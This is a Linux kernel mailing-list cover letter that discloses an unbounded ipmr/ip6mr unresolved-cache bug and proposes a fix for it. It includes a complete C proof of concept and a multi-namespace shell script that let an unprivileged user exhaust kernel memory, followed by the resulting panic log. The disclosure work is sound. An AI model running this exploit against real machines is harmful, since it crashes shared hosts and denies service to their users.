Received: from mail-pg1-f173.google.com (mail-pg1-f173.google.com [209.85.215.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3F7113D4114
	for <netdev@vger.kernel.org>; Fri, 28 Aug 2026 06:52:48 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.173
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787899976; cv=none; b=DrZ8run1EgnLYZIDNgvgDgWH54nJIGxSA6tTB4/dqrD6AHQHtmA6gyLDNstbuGYQ7pRspwGZI3WAnD2+GdV2vGn6RH81k7sld3HEwpawEvxEPFmeqT5+xvqNN23Mq1OKwHhIdGdIIA+XhUVxV5K2PFdxeP/YVBGX8yaVqf0fwe0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787899976; c=relaxed/simple;
	bh=rwwY6UMeSxul6fvqRUjP4vVtColc8P2iu+c5iHeBtak=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Qd9D1AWRQ5hYKTmcIl1RMZhVUFDrMrKWywAkeUahliFyyakmW41L0v8mA7l+MSf0sYWwjXUcOJnO5O6T80DZ1oY6JdZlV7+O7WyqsHth7TShjekiEd3sSljCP6brJrC41MYZ+Ba12m1MfQsdTVpx0C5p/HrLvB13fZcAdvISJv0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=RXoKBZ+h; arc=none smtp.client-ip=209.85.215.173
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="RXoKBZ+h"
Received: by mail-pg1-f173.google.com with SMTP id 41be03b00d2f7-cc1ceadbd16so571818a12.2
        for <netdev@vger.kernel.org>; Thu, 27 Aug 2026 23:52:48 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787899967; x=1788504767; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=shXyvEc0Y803JhojMJ8LHmzVwMuI0ZDEAUoK5X955Rs=;
        b=RXoKBZ+hBxIQACh5eNv3Z8S7ZXyxZlIlvb4ZhjXBWrfYi5Tre1jzM0vRFztveI3bMq
         O9WjHO/WGkTog8DoR5myDZSQStMXsgV07vnYoYZkyq0iHgniMO82rK7tzQTs0tWrzV8E
         U4ApS2HqKSW0/udnfBQKEF4JHGTbTA8LTwa9TFFXxLhGyiEqiIEmRJEVMkwXSayrgvzA
         8H7Ya5aUVis75K/i97T23oKiJVKXSiK/XSIoBv5lLHuK31pXJdEeMBkNMz4tkegg6hUP
         D//8H4s33jfcU0skBHeoVcDUE1lnC2NC/EeCpCKjeggbVwOF/9J/f8HqFDrctSqF5ktr
         WyVg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787899967; x=1788504767;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=shXyvEc0Y803JhojMJ8LHmzVwMuI0ZDEAUoK5X955Rs=;
        b=C+F9DI56izGmRt/qZjXK/4mHa5cNNrPMANUkg7BocvbUjfdDZq4g/MZltknC4a7I5z
         F913kA9J0dHE/hUVXGw2Cxpbtif6e6/FwkKA/Hcvac/PccMxiGYYQDxsYxMjezfRqkXq
         vVwclPuani/m9QJtOH15TRRWTfcsmH02ahfQzLRkWVW+/9AKzXcn71MVz/7t5JjIMusY
         FaYrPuTN+e9bmPrZFBjJ9b90VGpWAiPRcQ/Q9jJaBUPS5TKFQznN+AIby+gIdyHHmz55
         BmkKuGiRHdkgFUsuD0Da8lMyuQXm37VMmVYUU1B4pHLXbBh3ZhEcxyStIIhpPaZ9nSow
         1yNg==
X-Gm-Message-State: AFuF++n86vKgvsdhnU1pdrtsOkLHMmDD1/vyPAKGU1Qcl5XuNMhRJv/s
	bfzu+V3oKeRMUGTyNa/j0lWyfhIaDq7JLYd/iocsNfPZ5cm904J01YCkBpz0VFqJ8JN26BHiw7j
	DIpNQ/+FdqF16bA==
X-Gm-Gg: AR+sD12B86zK7SE8xzUC/c3gKDANtiFDUSjO8WhX+8QVrjyEgxoylMa5Y5WB2dbVb8m
	Kl2mi3SEv58Vs4RY/xekhMEAl3b2Wy1A1DlAQl+S09zSoHip/kKfFBy9Jv7lfwyBC6Zw9yEa6No
	l81ocnUnUoKqyFjYf8JCqDLL4ymCIp2KWiekvtWqnMC2eST77e4eyhTHT0g3bQt32yE5FzS2DB7
	CvO4brNPnFzSEvOvZJYAX9iNaXZFJTGOf+VF7RRiqIZEsRGKy/xj8F8Xmit3/Vz5RFo0jklz2IK
	Eu1ZatBRhqx6wEpBTP9XghdlESfGrf0/u6lHfrWspyUVJarQGkd/uiE7q+Mgs0YFjVBww6IuXMr
	eVSsvNY85BG2G/7ZUErxascvzYAZDsjmOdLz4454VXS5NRdWYWHu3DLy9IExZGA5L78Q/FOaHyD
	MWaAml3goZI00YKq6LHUMY+c8H09jyRB1B3kKDHR+H0ejmiRG6nqYZDZEIUqauffC+1iq/guKJJ
	vSK1c8OAM8RBg==
X-Received: by 2002:a17:90b:3d88:b0:38e:5964:97a8 with SMTP id 98e67ed59e1d1-396d0f52b40mr10291799a91.16.1787899966501;
        Thu, 27 Aug 2026 23:52:46 -0700 (PDT)
Received: from gmail.com ([202.201.11.204])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39675867f73sm3896705a91.4.2026.08.27.23.52.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 27 Aug 2026 23:52:45 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: linux-kernel@vger.kernel.org,
	David Ahern <dsahern@kernel.org>,
	Ido Schimmel <idosch@nvidia.com>,
	"David S. Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Hangbin Liu <liuhangbin@gmail.com>,
	Nikolay Aleksandrov <razor@blackwall.org>,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net 0/1] ipmr: restore a limit for unresolved cache entries
Date: Fri, 28 Aug 2026 06:52:34 +0000
Message-ID: <cover.1787854085.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/ip6mr.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ip6mr_cache_unresolved() creates one unresolved multicast cache entry for each
distinct source and group pair.  Each entry can retain up to four received
skbs while userspace resolves the route.  The cache_resolve_queue_len counter
was kept for reporting, but the entry-creation limit was removed by commit
0079ad8e8dc3 ("ipmr: remove hard code cache_resolve_queue_len limit").
Consequently, a userspace daemon that drains the routing upcalls can still
allow an unbounded number of entries and retained packet bodies.  A multicast
flood with distinct pairs can therefore exhaust kernel memory.  The same
missing bound exists in the IPv4 implementation.

This patch restores a shared ten-entry bound for both IPv4 and IPv6 unresolved
multicast caches.  Once the bound is reached, new source/group pairs are
rejected with -ENOBUFS; existing entries remain available for normal route
resolution and expiration.

The root-cause fix is tied to 0079ad8e8dc3, the commit that first removed the
entry bound.  Later changes only altered accounting and locking and did not
introduce the unbounded state.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

For the scalable namespace fan-out used for the OOM demonstration, run:

    chmod +x poc.sh
    BIN=$HOME/poc WORKERS=8 GROUPS=1000 REPEAT=4 PAYLOAD=60000 POST_WAIT=30 STATUS_EVERY=250 $HOME/poc.sh

packetdrill was not used because this trigger requires user and network
namespace creation, veth setup, MRT6_INIT/MRT6_ADD_MIF control-plane
configuration, and draining raw multicast-routing upcalls, which
packetdrill cannot express or coordinate.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/mroute6.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

struct config {
	const char *ifname;
	const char *sender_ifname;
	const char *bind_addr_str;
	unsigned int count;
	unsigned int repeat;
	unsigned int payload_len;
	unsigned int post_wait_sec;
	unsigned int status_every;
	unsigned int start_group;
	int upcall_rcvbuf;
	int send_sndbuf;
};

struct stats {
	volatile sig_atomic_t stop;
	volatile unsigned long upcalls;
};

struct thread_args {
	int fd;
	struct stats *stats;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [options]\n"
		"  --ifname IFACE        ingress vif interface (default: lo)\n"
		"  --sender-ifname IFACE sender output interface (default: --ifname)\n"
		"  --bind-addr ADDR      sender source address (default: ::1)\n"
		"  --count N             distinct multicast groups (default: 12000)\n"
		"  --repeat N            packets per group, max 4 useful (default: 4)\n"
		"  --payload N           UDP payload bytes per packet (default: 60000)\n"
		"  --post-wait SEC       sleep after sending (default: 20)\n"
		"  --status-every N      print progress every N groups (default: 1000)\n"
		"  --start-group N       low 32-bit group suffix base (default: 1)\n"
		"  --upcall-rcvbuf N     SO_RCVBUF for the mroute socket (default: 16777216)\n"
		"  --send-sndbuf N       SO_SNDBUF for the sender socket (default: 4194304)\n",
		prog);
}

static unsigned long now_ms(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (unsigned long)ts.tv_sec * 1000UL + ts.tv_nsec / 1000000UL;
}

static void on_signal(int signo)
{
	(void)signo;
}

static void *drain_thread(void *arg)
{
	struct thread_args *ta = arg;
	struct stats *stats = ta->stats;
	char buf[2048];

	while (!stats->stop) {
		ssize_t n = recv(ta->fd, buf, sizeof(buf), 0);

		if (n > 0) {
			__atomic_add_fetch(&stats->upcalls, 1, __ATOMIC_RELAXED);
			continue;
		}
		if (n == 0)
			break;
		if (errno == EINTR)
			continue;
		if (errno == EAGAIN || errno == EWOULDBLOCK) {
			usleep(1000);
			continue;
		}
		perror("recv(mroute upcall)");
		break;
	}

	return NULL;
}

static int create_mroute_socket(const struct config *cfg, struct stats *stats)
{
	int fd;
	int one = 1;
	pthread_t tid;
	struct mif6ctl vif = {0};
	int ifindex;
	struct thread_args *ta;

	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
	if (fd < 0) {
		perror("socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)");
		return -1;
	}

	if (cfg->upcall_rcvbuf > 0 &&
	    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &cfg->upcall_rcvbuf,
		       sizeof(cfg->upcall_rcvbuf)) < 0) {
		perror("setsockopt(SO_RCVBUF)");
		close(fd);
		return -1;
	}

	if (setsockopt(fd, IPPROTO_IPV6, MRT6_INIT, &one, sizeof(one)) < 0) {
		perror("setsockopt(MRT6_INIT)");
		close(fd);
		return -1;
	}

	ifindex = if_nametoindex(cfg->ifname);
	if (ifindex == 0) {
		perror("if_nametoindex");
		close(fd);
		return -1;
	}

	vif.mif6c_mifi = 0;
	vif.mif6c_flags = 0;
	vif.vifc_threshold = 1;
	vif.mif6c_pifi = ifindex;
	vif.vifc_rate_limit = 0;

	if (setsockopt(fd, IPPROTO_IPV6, MRT6_ADD_MIF, &vif, sizeof(vif)) < 0) {
		perror("setsockopt(MRT6_ADD_MIF)");
		close(fd);
		return -1;
	}

	ta = calloc(1, sizeof(*ta));
	if (!ta) {
		perror("calloc");
		close(fd);
		return -1;
	}

	ta->fd = fd;
	ta->stats = stats;

	if (pthread_create(&tid, NULL, drain_thread, ta) != 0) {
		perror("pthread_create");
		free(ta);
		close(fd);
		return -1;
	}

	pthread_detach(tid);
	return fd;
}

static int create_sender_socket(const struct config *cfg, const struct in6_addr *src)
{
	int fd;
	unsigned int ifindex;
	int hops = 1;
	int loop = 1;
	struct sockaddr_in6 bind_addr = {
		.sin6_family = AF_INET6,
		.sin6_addr = *src,
	};

	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket(AF_INET6, SOCK_DGRAM)");
		return -1;
	}

	if (cfg->send_sndbuf > 0 &&
	    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &cfg->send_sndbuf,
		       sizeof(cfg->send_sndbuf)) < 0) {
		perror("setsockopt(SO_SNDBUF)");
		close(fd);
		return -1;
	}

	ifindex = if_nametoindex(cfg->sender_ifname);
	if (ifindex == 0) {
		perror("if_nametoindex");
		close(fd);
		return -1;
	}

	if (setsockopt(fd, IPPROTO_IPV6, IPV6_MULTICAST_IF, &ifindex,
		       sizeof(ifindex)) < 0) {
		perror("setsockopt(IPV6_MULTICAST_IF)");
		close(fd);
		return -1;
	}

	if (setsockopt(fd, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops,
		       sizeof(hops)) < 0) {
		perror("setsockopt(IPV6_MULTICAST_HOPS)");
		close(fd);
		return -1;
	}

	if (setsockopt(fd, IPPROTO_IPV6, IPV6_MULTICAST_LOOP, &loop,
		       sizeof(loop)) < 0) {
		perror("setsockopt(IPV6_MULTICAST_LOOP)");
		close(fd);
		return -1;
	}

	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
		perror("bind(sender)");
		close(fd);
		return -1;
	}

	return fd;
}

static void make_group_addr(struct in6_addr *addr, unsigned int suffix)
{
	memset(addr, 0, sizeof(*addr));
	addr->s6_addr[0] = 0xff;
	addr->s6_addr[1] = 0x0e;
	((uint32_t *)addr->s6_addr)[3] = htonl(suffix);
}

int main(int argc, char **argv)
{
	struct config cfg = {
		.ifname = "lo",
		.sender_ifname = "lo",
		.bind_addr_str = "::1",
		.count = 12000,
		.repeat = 4,
		.payload_len = 60000,
		.post_wait_sec = 20,
		.status_every = 1000,
		.start_group = 1,
		.upcall_rcvbuf = 16 * 1024 * 1024,
		.send_sndbuf = 4 * 1024 * 1024,
	};
	struct stats stats = {0};
	struct sigaction sa = {
		.sa_handler = on_signal,
	};
	struct in6_addr src;
	int mroute_fd = -1;
	int send_fd = -1;
	char *payload = NULL;
	unsigned long start_ms;
	unsigned long sent_pkts = 0;
	unsigned int i, r;

	for (i = 1; i < (unsigned int)argc; i++) {
		if (!strcmp(argv[i], "--ifname") && i + 1 < (unsigned int)argc) {
			cfg.ifname = argv[++i];
			cfg.sender_ifname = cfg.ifname;
		} else if (!strcmp(argv[i], "--sender-ifname") &&
			   i + 1 < (unsigned int)argc) {
			cfg.sender_ifname = argv[++i];
		} else if (!strcmp(argv[i], "--bind-addr") &&
			   i + 1 < (unsigned int)argc) {
			cfg.bind_addr_str = argv[++i];
		} else if (!strcmp(argv[i], "--count") && i + 1 < (unsigned int)argc) {
			cfg.count = strtoul(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--repeat") && i + 1 < (unsigned int)argc) {
			cfg.repeat = strtoul(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--payload") && i + 1 < (unsigned int)argc) {
			cfg.payload_len = strtoul(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--post-wait") && i + 1 < (unsigned int)argc) {
			cfg.post_wait_sec = strtoul(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--status-every") && i + 1 < (unsigned int)argc) {
			cfg.status_every = strtoul(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--start-group") && i + 1 < (unsigned int)argc) {
			cfg.start_group = strtoul(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--upcall-rcvbuf") && i + 1 < (unsigned int)argc) {
			cfg.upcall_rcvbuf = strtol(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--send-sndbuf") && i + 1 < (unsigned int)argc) {
			cfg.send_sndbuf = strtol(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--help")) {
			usage(argv[0]);
			return 0;
		} else {
			usage(argv[0]);
			return 1;
		}
	}

	if (cfg.repeat == 0)
		cfg.repeat = 1;

	if (cfg.payload_len == 0 || cfg.payload_len > 65507) {
		fprintf(stderr, "payload must be in 1..65507\n");
		return 1;
	}

	if (cfg.status_every == 0)
		cfg.status_every = cfg.count;

	memset(&src, 0, sizeof(src));
	if (inet_pton(AF_INET6, cfg.bind_addr_str, &src) != 1) {
		fprintf(stderr, "inet_pton(%s) failed\n", cfg.bind_addr_str);
		return 1;
	}

	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	sigaction(SIGINT, &sa, NULL);
	sigaction(SIGTERM, &sa, NULL);

	payload = malloc(cfg.payload_len);
	if (!payload) {
		perror("malloc(payload)");
		return 1;
	}
	memset(payload, 'A', cfg.payload_len);

	mroute_fd = create_mroute_socket(&cfg, &stats);
	if (mroute_fd < 0)
		goto out;

	send_fd = create_sender_socket(&cfg, &src);
	if (send_fd < 0)
		goto out;

	fprintf(stderr,
		"[+] vif_if=%s sender_if=%s bind=%s groups=%u repeat=%u payload=%u post_wait=%u upcall_rcvbuf=%d sndbuf=%d\n",
		cfg.ifname, cfg.sender_ifname, cfg.bind_addr_str,
		cfg.count, cfg.repeat, cfg.payload_len,
		cfg.post_wait_sec, cfg.upcall_rcvbuf, cfg.send_sndbuf);

	start_ms = now_ms();
	for (i = 0; i < cfg.count; i++) {
		struct in6_addr group;
		struct sockaddr_in6 dst = {
			.sin6_family = AF_INET6,
			.sin6_port = htons(31337),
		};

		make_group_addr(&group, cfg.start_group + i);
		dst.sin6_addr = group;

		for (r = 0; r < cfg.repeat; r++) {
			ssize_t n = sendto(send_fd, payload, cfg.payload_len, 0,
					   (struct sockaddr *)&dst, sizeof(dst));

			if (n < 0) {
				fprintf(stderr,
					"sendto failed at group=%u repeat=%u: %s\n",
					cfg.start_group + i, r, strerror(errno));
				goto out;
			}
			sent_pkts++;
		}

		if ((i + 1) % cfg.status_every == 0) {
			unsigned long elapsed = now_ms() - start_ms;
			unsigned long upcalls =
				__atomic_load_n(&stats.upcalls, __ATOMIC_RELAXED);

			fprintf(stderr,
				"[+] groups=%u packets=%lu upcalls=%lu elapsed_ms=%lu\n",
				i + 1, sent_pkts, upcalls, elapsed);
		}
	}

	fprintf(stderr,
		"[+] completed send: groups=%u packets=%lu, waiting %u seconds for expiry effects\n",
		cfg.count, sent_pkts, cfg.post_wait_sec);

	for (i = 0; i < cfg.post_wait_sec; i++) {
		unsigned long upcalls =
			__atomic_load_n(&stats.upcalls, __ATOMIC_RELAXED);

		fprintf(stderr, "[+] wait=%u/%u upcalls=%lu\n",
			i + 1, cfg.post_wait_sec, upcalls);
		sleep(1);
	}

	fprintf(stderr, "[+] done\n");

out:
	stats.stop = 1;
	if (send_fd >= 0)
		close(send_fd);
	if (mroute_fd >= 0)
		close(mroute_fd);
	free(payload);
	return 0;
}
------END poc.c--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

WORKERS="${WORKERS:-8}"
GROUPS="${GROUPS:-1000}"
REPEAT="${REPEAT:-4}"
PAYLOAD="${PAYLOAD:-60000}"
POST_WAIT="${POST_WAIT:-30}"
STATUS_EVERY="${STATUS_EVERY:-250}"
BIN="${BIN:-$(dirname "$0")/poc}"

echo "date: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "workers=$WORKERS groups=$GROUPS repeat=$REPEAT payload=$PAYLOAD post_wait=$POST_WAIT status_every=$STATUS_EVERY"
grep MemAvailable /proc/meminfo || true

i=1
while [ "$i" -le "$WORKERS" ]; do
	log="/tmp/ip6mr-worker-$i.log"
	rm -f "$log"
	unshare -Urn sh -eu -c "
		ip link set lo up
		ip link add v0 type veth peer name v1
		ip link set v0 mtu 65535
		ip link set v1 mtu 65535
		ip link set v0 up
		ip link set v1 up
		ip -6 addr add fd00:1::1/64 dev v0 nodad
		ip -6 addr add fd00:1::2/64 dev v1 nodad
		ip -6 route replace ff0e::/16 dev v0
		exec \"$BIN\" \
			--ifname v1 \
			--sender-ifname v0 \
			--bind-addr fd00:1::1 \
			--count \"$GROUPS\" \
			--repeat \"$REPEAT\" \
			--payload \"$PAYLOAD\" \
			--post-wait \"$POST_WAIT\" \
			--status-every \"$STATUS_EVERY\"
	" >"$log" 2>&1 &
	i=$((i + 1))
done

echo "spawned $WORKERS workers"
sleep 3
grep MemAvailable /proc/meminfo || true

i=1
while [ "$i" -le "$WORKERS" ]; do
	log="/tmp/ip6mr-worker-$i.log"
	echo "== worker $i =="
	sed -n '1,12p' "$log" || true
	i=$((i + 1))
done

wait
------END poc.sh--------

The unpatched baseline was built with a matching vmlinux, and
scripts/decode_stacktrace.sh was used to decode the panic.  Host-specific boot
and audit lines are omitted from this excerpt.

----BEGIN crash log----
[    0.000000] Linux version 7.2.0-07323-gf967455fb2a5 (gcc (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #3 SMP PREEMPT_DYNAMIC Fri Aug 28 04:02:55 CST 2026
[    0.000000] Command line: console=ttyS0 earlyprintk=serial panic_on_warn=1 vm.panic_on_oom=2 panic=0 oops=panic
[   10.202095] mfc6_cache              2935KB       2937KB
[   10.534887] skbuff_small_head      27400KB      27408KB
[   11.571405] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[   11.580743] CPU: 0 UID: 1001 PID: 281 Comm: poc Not tainted 7.2.0-07323-gf967455fb2a5 #3 PREEMPT(lazy) 
[   11.591081] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   11.603815] Call Trace:
[   11.606822]  <TASK>
[   11.609192]  vpanic (kernel/panic.c:651)
[   11.613068]  panic (kernel/panic.c:788)
[   11.616702]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oom_kill.c:1143 (discriminator 4))
[   11.620969]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4116 mm/page_alloc.c:4967 mm/page_alloc.c:5317)
[   11.626505]  alloc_pages_mpol (mm/mempolicy.c:2490)
[   11.630274]  alloc_pages_noprof (mm/mempolicy.c:2561 (discriminator 1) mm/mempolicy.c:2581 (discriminator 1))
[   11.635422]  skb_page_frag_refill (net/core/sock.c:3202 (discriminator 2))
[   11.639885]  sk_page_frag_refill (net/core/sock.c:3213)
[   11.644137]  __ip6_append_data (net/ipv6/ip6_output.c:1805)
[   11.648942]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)
[   11.654201]  ip6_make_skb (net/ipv6/ip6_output.c:2092)
[   11.658079]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)
[   11.664092]  ? udpv6_sendmsg (net/ipv6/udp.c:1707)
[   11.668952]  udpv6_sendmsg (net/ipv6/udp.c:1707)
[   11.673286]  ? __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[   11.677008]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[   11.681310]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[   11.684892]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   11.688175]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   11.694499] RIP: 0033:0x425a84
[   11.697800] Code: Unable to access opcode bytes at 0x425a5a.

Code starting with the faulting instruction
===========================================
[   11.703181] RSP: 002b:00007ffee51635a0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
[   11.711403] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000425a84
[   11.719898] RDX: 000000000000ea60 RSI: 000000001cf87950 RDI: 0000000000000004
[   11.728079] RBP: 00007ffee51635e0 R08: 00007ffee5163690 R09: 000000000000001c
[   11.737370] R10: 0000000000000000 R11: 0000000000000293 R12: 0000000000000e21
[   11.745913] R13: 0000000000000388 R14: 00007ffee5163690 R15: 0000000000000001
[   11.753149]  </TASK>
[   11.755862] Kernel Offset: 0x400000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   11.766404] ---[ end Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled ]---
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  ipmr: restore a limit for unresolved cache entries

 include/linux/mroute_base.h | 3 +++
 net/ipv4/ipmr.c             | 6 ++++++
 net/ipv6/ip6mr.c            | 5 +++++
 3 files changed, 14 insertions(+)

-- 
2.43.0

